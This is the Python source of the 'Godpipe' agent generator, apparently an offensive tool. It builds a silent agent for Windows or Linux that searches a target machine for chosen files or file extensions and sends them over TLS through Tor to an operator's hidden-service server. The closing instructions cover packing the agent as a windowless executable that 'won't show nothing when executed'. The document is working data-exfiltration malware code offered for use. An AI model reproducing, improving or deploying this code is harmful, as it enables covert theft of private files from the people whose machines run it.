import subprocess, re
from colorama import init, Fore, Style

# Initialize for colored output
init()


def banner():
    print(f"""{Fore.GREEN}
          
     ██████╗  ██████╗ ██████╗ ██████╗ ██╗██████╗ ███████╗
    ██╔════╝ ██╔═══██╗██╔══██╗██╔══██╗██║██╔══██╗██╔════╝
    ██║  ███╗██║   ██║██║  ██║██████╔╝██║██████╔╝█████╗  
    ██║   ██║██║   ██║██║  ██║██╔═══╝ ██║██╔═══╝ ██╔══╝  
    ╚██████╔╝╚██████╔╝██████╔╝██║     ██║██║     ███████╗
     ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚══════╝
                                                
                {Style.RESET_ALL}Agent generator by {Fore.RED}@Slayer0x{Style.RESET_ALL}""")
    

def checkroot():
    # Run 'id -u' to get the current user's UID
    result = subprocess.run(['id', '-u'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Check if the UID is 0 (root user)
    if result.returncode == 0 and int(result.stdout.decode().strip()) != 0:
        print(f"\n{Fore.RED} [!] The script must be executed as a privileged user (root).\n{Style.RESET_ALL}")
        exit(1)

def agent_generator():
    
    # Get al the information we need from the server by opening the tor config files and grabing the info
    server_host = subprocess.run(["cat", "/var/lib/tor/hidden_service/hostname"], capture_output=True, text=True).stdout.strip()
    with open('/etc/tor/torrc', "r") as file:
        content = file.read()
        pattern = r"(?<!#)\bHiddenServicePort\s+\d+\s+\d+\.\d+\.\d+\.\d+:(\d+)"
        matches = re.findall(pattern, content)
        if matches:
            server_port = int(matches[0])  # Convert the port number to a integer value.
        else:
            print(f"{Fore.RED} \n[!] Error, unable to find the running port number, delete /etc/tor/torrc and ./certs directory and execute the relay_setup.sh & godpipe_server script again {Style.RESET_ALL}\n")
            exit(1)

    # Grab The Server Certificates         
    server_certificate = subprocess.run(["base64", "certs/server.crt", "-w", "0"], capture_output=True, text=True).stdout.strip()
    
    subprocess.run(["clear"])
    banner()

    # Menu 
    print(f"{Fore.MAGENTA}\n [*] Transfer Options [*] \n{Style.RESET_ALL}")
    print(f"{Fore.CYAN} 1. Send a specific file.")
    print(f" 2. Send files with a certain extension from a specific directory.")
    print(f" 3. Send all files with a certain extension in the system.{Style.RESET_ALL}")
    choice = input(f"{Fore.YELLOW}\n [?] Select an option (1-3): {Style.RESET_ALL}").strip()

    if choice == "1":
        path = input(f"{Fore.YELLOW}\n [?] Enter the absolute path of the file to send: {Style.RESET_ALL}")
        file_path = path.replace("\\", "/")  # If we don't sanitize this input, it doesn't pack the binary later

    elif choice in {"2", "3"}:
        while True:
            extensions = input(f"{Fore.YELLOW}\n [?] Enter the extensions (separated by commas, e.g., .txt, .pdf): {Style.RESET_ALL}").strip()

            if extensions:
                # Ensure extensions start with a dot and only contain letters/numbers
                if all(re.match(r'^\.[a-zA-Z0-9]+$', ext.strip()) for ext in extensions.split(',')):
                    break  # Valid input, break out of loop
                else:
                    subprocess.run(["clear"])
                    print(f"{Fore.RED}\n [!] Invalid extension format. Each extension should start with a dot and contain only letters or numbers. {Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}\n [!] Please enter at least one extension. {Style.RESET_ALL}")

        # Only ask for directory if choice is 2
        if choice == "2":
            dir = input(f"{Fore.YELLOW}\n [?] Enter the directory path (e.g. C:\\users\\): {Style.RESET_ALL}").strip()
            dir_path = dir.replace("\\", "/") # We need to sanitize this if not we get errors when packing  
    else:
        print(f"\n{Fore.RED} [!] Invalid option selected  {Style.RESET_ALL}")
        return
    
    # We need to change the path to the tor binary depending on the os to be executed at, that's why we ask this:
    target_os = input(f"{Fore.YELLOW}\n [?] Do you want to generate an agent for Linux or Windows (w/l): {Style.RESET_ALL}").lower()
    while target_os not in ['w', 'l']:
        subprocess.run(["clear"])
        print(f"\n{Fore.RED} [!] Invalid input. Please enter 'w' for Windows or 'l' for Linux.")
        target_os = input(f"{Fore.YELLOW}\n [?] Do you want to generate an agent for Linux or Windows (w/l): {Style.RESET_ALL}").lower()


    # Create the script with the configuration supplied by the user
    script_content = f"""import ssl, base64, subprocess, socks
from io import BytesIO
from pathlib import Path


CERTIFICATE_BASE64 = "{server_certificate}"

def load_certificate_from_memory(base64_cert):
    cert_data = base64.b64decode(base64_cert)
    cert_file = BytesIO(cert_data)
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context.load_verify_locations(cadata=cert_file.read().decode())
    return context

def search_files(base_path, extensions):
    base_path = Path(base_path)
    matching_files = []
    try:
        extensions = [ext.strip().lower() for ext in extensions]
        for ext in extensions:
            for file in base_path.rglob(f"*{{ext}}"):
                matching_files.append(str(file.resolve()))
    except PermissionError as e:
        pass
    return matching_files

def start_tor():
"""
    if {target_os} == 'w':
        script_content += f"""    
    temp_path = getattr(sys, '_MEIPASS', os.path.abspath("."))
    base_path = os.path.join(temp_path, "tor", "tor.exe")"""
    else:
        script_content += f"""  
    temp_path = getattr(sys, '_MEIPASS', os.path.abspath("."))
    base_path = os.path.join(temp_path, "tor", "tor")

    tor_process = subprocess.Popen([base_path, '--SocksPort', '9050'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    for line in iter(tor_process.stdout.readline, ''):
        print(line.strip()) 
        if "Bootstrapped 100%" in line:
            break
    
    return tor_process

def stop_tor(tor_process):
    tor_process.terminate()

def send_file(server_host, server_port, file_path, ssl_context):
    sock = socks.socksocket()
    sock.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    sock.connect((server_host, server_port))
    with ssl_context.wrap_socket(sock, server_hostname=server_host) as secure_sock:
        file_name = Path(file_path).name
        secure_sock.sendall(file_name.encode())
        response = secure_sock.recv(1024)
        if response != b"OK":
            return
        with open(file_path, "rb") as file:
            while chunk := file.read(65536):
                secure_sock.sendall(chunk)
                response = secure_sock.recv(1024)
                if response != b"CHUNK_RECEIVED":
                    return
        secure_sock.sendall(b"EOF")

if __name__ == "__main__":
    tor_process = start_tor()
    try:
        server_host = "{server_host}"
        server_port = {server_port}
        ssl_context = load_certificate_from_memory(CERTIFICATE_BASE64)
"""
    if choice == "1":
        script_content += f"""
        send_file(server_host, server_port, "{file_path}", ssl_context)
"""
    elif choice == "2":
        script_content += f"""
        dir_path = "{dir_path}"
        extensions = "{extensions}".split(",")
        files_to_send = search_files(dir_path, extensions)
        for file_path in files_to_send:
            send_file(server_host, server_port, file_path, ssl_context)
"""
    elif choice == "3":
        script_content += f"""
        base_path = Path.home()
        extensions = "{extensions}".split(",")
        files_to_send = search_files(base_path, extensions)
        for file_path in files_to_send:
            send_file(server_host, server_port, file_path, ssl_context)
"""
    script_content += """
    finally:
        stop_tor(tor_process)
"""
    try: # Check / Create the Agents dir if not exists
        subprocess.run(["mkdir", "Agents"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    except subprocess.CalledProcessError:
        pass
    
    # Copy all the files needed to pack the binary on the /Agents dir.
     
    if target_os == 'w': # Depending on the target os, we delive the correct tor binarie. 
        subprocess.run(["cp", "-r", "resources/tor_windows", "Agents/"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    else:
        subprocess.run(["cp",  "-r", "resources/tor_linux", "Agents/"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

    subprocess.run(["cp", "resources/Requirements.txt", "Agents/"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    
    # Save the generated agent at /Agents
    output_file = "Agents/godpipe_agent.py"
    with open(output_file, "w") as file:
        file.write(script_content)

    # We need to grant this privileges cause if not the transfered files won´t be accesible to the user (without using root).
    subprocess.run(["chmod", "-R", "a+rx", "resources/", "Agents/"], check=True)

    subprocess.run(["clear"], check=True)

    # Instructions to pack the generated agent
     
    print(f"{Fore.GREEN}\n [V] Agent successfully generated at: {Style.RESET_ALL}" + output_file + "\n")
    print(f"""{Fore.YELLOW} [i] How to pack your agent to make it executable/portable [i] {Style.RESET_ALL}
    \n  1. Copy all the conent from the /Agent directory to a VM that shares the same architecture as your agent. (e.g. Windows 11)
    \n  2. Install python3 and pip.
    \n  3. Install the requierements: pip install -r Requirements.txt.
    \n  4. Pack the agent: pyinstaller.exe --onefile --noconsole --add-data "tor_windows;tor" godpipe_agent.py
    \n  5. Check for your executable at /dist once the packing process completes.
    \n  6. The resultant binarie won´t show nothing when executed, all the parameters are hardcoded, just wait to recieve your target files on your Godpipe Server. (Takes some time, don´t kill the process)
    \n\n{Fore.CYAN}  Enjoy;) \n{Style.RESET_ALL}""")
    
    
if __name__ == "__main__":
    try:
        checkroot()
        agent_generator()
    except KeyboardInterrupt:
            print(f"{Fore.RED}\n\n [!] Exiting...\n{Style.RESET_ALL}")
            exit(0)  # Exit the script with code 0 (no error if CTRL + C)